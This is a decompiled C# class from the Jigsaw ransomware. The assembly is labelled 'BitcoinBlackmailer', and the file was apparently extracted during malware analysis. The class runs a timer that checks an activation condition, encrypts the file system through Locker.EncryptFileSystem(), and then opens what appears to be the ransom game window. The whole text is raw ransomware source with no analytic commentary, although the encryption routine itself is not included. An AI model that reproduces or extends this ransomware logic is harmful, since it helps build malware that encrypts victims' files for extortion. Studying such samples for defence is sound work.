// Decompiled with JetBrains decompiler
// Type: Main.FormBackground
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using Main.Tools;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Main
{
  public class FormBackground : Form
  {
    private IContainer components;
    private Timer timerActivateChecker;

    public FormBackground()
    {
      this.InitializeComponent();
      FormBackground.smethod_0(this.timerActivateChecker, Config.TimerActivateCheckerInterval);
      FormBackground.smethod_1(this.timerActivateChecker, true);
    }

    private void timerActivateChecker_Tick(object sender, EventArgs e)
    {
      if (Config.Activated || !Hacking.ShouldActivate())
        return;
      Config.Activated = true;
      FormBackground.ImposeRestrictions();
      FormBackground.smethod_2((Form) new FormGame(), (IWin32Window) this);
    }

    private static void ImposeRestrictions() => Locker.EncryptFileSystem();

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        FormBackground.smethod_3((IDisposable) this.components);
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) FormBackground.smethod_4();
      this.timerActivateChecker = FormBackground.smethod_5(this.components);
      FormBackground.smethod_6((Control) this);
      FormBackground.smethod_1(this.timerActivateChecker, true);
      FormBackground.smethod_7(this.timerActivateChecker, new EventHandler(this.timerActivateChecker_Tick));
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Name = nameof (FormBackground);
      this.Text = "Form1";
      this.ResumeLayout(false);
    }

    static void smethod_0(Timer timer_0, int int_0) => timer_0.Interval = int_0;

    static void smethod_1(Timer timer_0, bool bool_0) => timer_0.Enabled = bool_0;

    static void smethod_2(Form form_0, IWin32Window iwin32Window_0) => form_0.Show(iwin32Window_0);

    static void smethod_3(IDisposable idisposable_0) => idisposable_0.Dispose();

    static System.ComponentModel.Container smethod_4() => new System.ComponentModel.Container();

    static Timer smethod_5(IContainer icontainer_0) => new Timer(icontainer_0);

    static void smethod_6(Control control_0) => control_0.SuspendLayout();

    static void smethod_7(Timer timer_0, EventHandler eventHandler_0) => timer_0.Tick += eventHandler_0;
  }
}
